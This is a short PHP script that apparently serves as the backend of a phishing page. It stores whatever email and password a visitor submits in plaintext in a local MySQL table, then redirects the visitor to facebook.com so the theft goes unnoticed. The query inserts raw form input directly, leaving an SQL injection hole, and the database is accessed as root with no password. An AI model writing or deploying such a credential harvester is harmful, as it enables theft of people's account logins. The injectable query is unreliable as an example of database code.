<?php
if(isset($_POST['Login']))
{error_reporting(1);
	mysql_connect("localhost","root","");
	mysql_select_db("uas");

	$user=$_POST['email'];
	$pass=$_POST['password'];

	$que1=mysql_query("INSERT INTO uas VALUES('', '$user', '$pass')");
	
	header("location:http://facebook.com");
}
?>